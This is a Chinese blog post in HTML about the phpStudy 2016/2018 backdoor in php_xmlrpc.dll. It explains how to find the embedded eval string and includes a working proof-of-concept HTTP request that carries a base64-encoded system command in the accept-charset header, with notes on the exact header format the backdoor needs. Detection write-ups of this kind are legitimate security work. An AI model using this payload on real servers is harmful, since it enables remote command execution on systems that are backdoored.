@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="phpstudy后门 0x01 前言 phpstudy是一个php运行环境的集成包，用户不需要去配置运行环境，就可以使用 0x02 问题版本phpStudy2016 ：php-5.2.17、php-5.4.45  phpStudy2018 ：php-5.2.17、php-5.4.45 0x03 排查方法1.问题文件为：php_xmlrpc.dll，在每个php版本目录的ext目录下面都有一个 2.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpstud后门利用和分析">
+<meta property="og:url" content="http://lilifengcode.github.io/post/90ddb320.html">
+<meta property="og:site_name" content="裁决的博客">
+<meta property="og:description" content="phpstudy后门 0x01 前言 phpstudy是一个php运行环境的集成包，用户不需要去配置运行环境，就可以使用 0x02 问题版本phpStudy2016 ：php-5.2.17、php-5.4.45  phpStudy2018 ：php-5.2.17、php-5.4.45 0x03 排查方法1.问题文件为：php_xmlrpc.dll，在每个php版本目录的ext目录下面都有一个 2.">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/24/uAxE2n.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/24/uASsL6.md.png">
+<meta property="og:updated_time" content="2019-10-31T14:24:21.566Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpstud后门利用和分析">
+<meta name="twitter:description" content="phpstudy后门 0x01 前言 phpstudy是一个php运行环境的集成包，用户不需要去配置运行环境，就可以使用 0x02 问题版本phpStudy2016 ：php-5.2.17、php-5.4.45  phpStudy2018 ：php-5.2.17、php-5.4.45 0x03 排查方法1.问题文件为：php_xmlrpc.dll，在每个php版本目录的ext目录下面都有一个 2.">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/09/24/uAxE2n.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>phpstud后门利用和分析</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/lilifengcode">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/post/b6304875.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/post/2082541d.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lilifengcode.github.io/post/90ddb320.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lilifengcode.github.io/post/90ddb320.html&text=phpstud后门利用和分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lilifengcode.github.io/post/90ddb320.html&title=phpstud后门利用和分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lilifengcode.github.io/post/90ddb320.html&is_video=false&description=phpstud后门利用和分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpstud后门利用和分析&body=Check out this article: http://lilifengcode.github.io/post/90ddb320.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lilifengcode.github.io/post/90ddb320.html&title=phpstud后门利用和分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lilifengcode.github.io/post/90ddb320.html&title=phpstud后门利用和分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lilifengcode.github.io/post/90ddb320.html&title=phpstud后门利用和分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lilifengcode.github.io/post/90ddb320.html&title=phpstud后门利用和分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lilifengcode.github.io/post/90ddb320.html&name=phpstud后门利用和分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#phpstudy后门"><span class="toc-number">1.</span> <span class="toc-text">phpstudy后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-前言"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-问题版本"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 问题版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-排查方法"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 排查方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-修复方式"><span class="toc-number">1.4.</span> <span class="toc-text">0x05 修复方式</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        phpstud后门利用和分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">裁决的博客</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-09-23T14:23:20.000Z" itemprop="datePublished">2019-09-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="phpstudy后门"><a href="#phpstudy后门" class="headerlink" title="phpstudy后门"></a>phpstudy后门</h1><p><img src="https://s2.ax1x.com/2019/09/24/uAxE2n.jpg" alt></p>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p> phpstudy是一个php运行环境的集成包，用户不需要去配置运行环境，就可以使用</p>
+<h2 id="0x02-问题版本"><a href="#0x02-问题版本" class="headerlink" title="0x02 问题版本"></a>0x02 问题版本</h2><p>phpStudy2016 ：php-5.2.17、php-5.4.45 </p>
+<p>phpStudy2018 ：php-5.2.17、php-5.4.45</p>
+<h2 id="0x03-排查方法"><a href="#0x03-排查方法" class="headerlink" title="0x03 排查方法"></a>0x03 排查方法</h2><p>1.问题文件为：php_xmlrpc.dll，在每个php版本目录的ext目录下面都有一个</p>
+<p>2.用记事本打开，CTRL+F搜索eval，有<figure class="highlight plain"><figcaption><span>%s;@eval(%s('%s')); $V</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](https://s2.ax1x.com/2019/09/24/ukxPTe.png)</span><br><span class="line"></span><br><span class="line">## 0x04 后门复现</span><br><span class="line"></span><br><span class="line">poc: 【poc放出来源**圈子社区**】</span><br><span class="line"></span><br><span class="line">```http</span><br><span class="line">GET /caijue.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Cookie: PHPSESSID=fg6b95loelkml2384i5lg7d4l3</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></p>
+<p>注意点：Accept-Encoding: gzip,deflate 两种编码方式之间没有空格</p>
+<p>​               accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7 执行的命令base64加密</p>
+<p><img src="https://s2.ax1x.com/2019/09/24/uASsL6.md.png" alt></p>
+<h2 id="0x05-修复方式"><a href="#0x05-修复方式" class="headerlink" title="0x05 修复方式"></a>0x05 修复方式</h2><p>等官网发布修复版本吧</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/lilifengcode">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#phpstudy后门"><span class="toc-number">1.</span> <span class="toc-text">phpstudy后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-前言"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-问题版本"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 问题版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-排查方法"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 排查方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-修复方式"><span class="toc-number">1.4.</span> <span class="toc-text">0x05 修复方式</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lilifengcode.github.io/post/90ddb320.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lilifengcode.github.io/post/90ddb320.html&text=phpstud后门利用和分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lilifengcode.github.io/post/90ddb320.html&title=phpstud后门利用和分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lilifengcode.github.io/post/90ddb320.html&is_video=false&description=phpstud后门利用和分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpstud后门利用和分析&body=Check out this article: http://lilifengcode.github.io/post/90ddb320.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lilifengcode.github.io/post/90ddb320.html&title=phpstud后门利用和分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lilifengcode.github.io/post/90ddb320.html&title=phpstud后门利用和分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lilifengcode.github.io/post/90ddb320.html&title=phpstud后门利用和分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lilifengcode.github.io/post/90ddb320.html&title=phpstud后门利用和分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lilifengcode.github.io/post/90ddb320.html&name=phpstud后门利用和分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 裁决
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/lilifengcode">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
